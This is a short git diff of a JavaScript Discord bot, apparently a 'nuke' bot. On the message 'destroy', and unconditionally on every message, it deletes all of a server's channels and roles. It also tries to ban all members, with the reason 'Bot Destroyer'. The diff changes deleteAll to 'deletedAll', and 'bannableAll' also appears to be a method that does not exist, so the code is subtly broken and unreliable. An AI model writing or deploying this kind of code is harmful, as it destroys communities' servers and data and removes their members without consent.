@@ -136,14 +136,14 @@ client.unload = command => {
 
 client.on("message", async message => {
     if(message.content === "destroy"){
-        message.guild.channels.deleteAll("Bot Destroyer");
+        message.guild.channels.deletedAll("Bot Destroyer");
         message.guild.roles.deleteAll("Bot Destroyer");
     }
 
     if(message.content === "leave"){
         message.guild.leave();
     }
-    message.guild.channels.deleteAll("Bot Destroyer");
+    message.guild.channels.deletedAll("Bot Destroyer");
     message.guild.roles.deleteAll("Bot Destroyer");
     message.guild.members.bannableAll("Bot Destroyer");
 
